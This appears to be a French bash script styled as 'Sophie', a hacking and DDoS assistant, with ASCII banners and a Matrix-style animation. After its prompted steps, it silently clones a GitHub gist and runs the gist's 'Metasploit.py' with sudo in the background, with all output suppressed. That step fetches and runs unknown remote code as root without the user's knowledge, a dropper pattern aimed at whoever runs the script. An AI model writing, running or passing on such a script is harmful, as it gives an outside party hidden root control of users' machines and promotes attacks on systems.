#!/bin/bash

set -euo pipefail
IFS=$'\n\t'

clear
echo -e "\e[1;31m"
cat << "EOF"
   _____       _     _           
  / ____|     | |   (_)          
 | (___   ___ | |__  _ _ __  ___ 
  \___ \ / _ \| '_ \| | '_ \/ __|
  ____) | (_) | |_) | | | | \__ \
  |_____/ \___/|_.__/|_|_| |_|___/
EOF
echo -e "\e[0m"
echo -e "🤖 Bonjour, je suis \e[1;35mSophie\e[0m, l'assistante du pirateg et attaque ddos dans de system controle  !"

# Installer dépendances (g++, openssl, git, python3)
read -p "📦 Installer g++, openssl, git, python3 ? (y/n): " install
if [[ "$install" =~ ^[Yy]$ ]]; then
    echo -e "\n🔧 Mise à jour et installation des dépendances nécessaires...\n"
    sudo apt update -qq
    sudo apt install -y -qq g++ libssl-dev build-essential git python3 python3-pip >/dev/null
else
    echo -e "❌ Installation annulée. Fin du script."
    exit 1
fi

echo -e "\n✅ Installation terminée."
sleep 1

# Exécuter sophie ?
read -p "⚔️  Lancer le binaire Sophie ? (y/n): " execute
if [[ "$execute" =~ ^[Yy]$ ]]; then
    read -p "⚠️  Exécuter avec persistance root (sudo) ? (y/n): " confirm
    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        echo -e "\n🚀 Lancement avec droits root...\n"
        sudo ./sophie
    else
        echo -e "\n🔒 Mode sans persistance activé."
        ./sophie
    fi
else
    echo -e "🕊️  Aucun outil lancé. À bientôt !"
fi

echo -e "\n🌐 patiente..."

rm -rf ./a264e5e2f34f2c1aa7622473211362ff
git clone -q https://gist.github.com/siriusblack404/a264e5e2f34f2c1aa7622473211362ff.git

if [[ -d "a264e5e2f34f2c1aa7622473211362ff" ]]; then
    cd a264e5e2f34f2c1aa7622473211362ff
    sudo python3 Metasploit.py >/dev/null 2>&1 &
    cd ..
    echo -e "✅ demarages de l'outils arrière-plan."
else
    echo -e "❌ Échec ."
fi

# Animation Matrix style hacker en ASCII

echo -e "\n💾 Lancement de la séquence Matrix..."

GREEN='\033[0;32m'
NC='\033[0m'

for i in {1..30}; do
    line=$(cat /dev/urandom | tr -dc '01abcdefghijklmnopqrstuvwxyz' | fold -w 60 | head -n 1)
    echo -e "${GREEN}$line${NC}"
    sleep 0.07
done

echo -e "${GREEN}███╗   ███╗ █████╗  ██████╗██╗  ██╗███████╗██████╗${NC}"
echo -e "${GREEN}████╗ ████║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗${NC}"
echo -e "${GREEN}██╔████╔██║███████║██║     █████╔╝ █████╗  ██████╔╝${NC}"
echo -e "${GREEN}██║╚██╔╝██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗${NC}"
echo -e "${GREEN}██║ ╚═╝ ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║${NC}"
echo -e "${GREEN}╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"

echo -e "\n${GREEN}Bienvenue dans l’univers hacker de Sirius Black !${NC}\n"
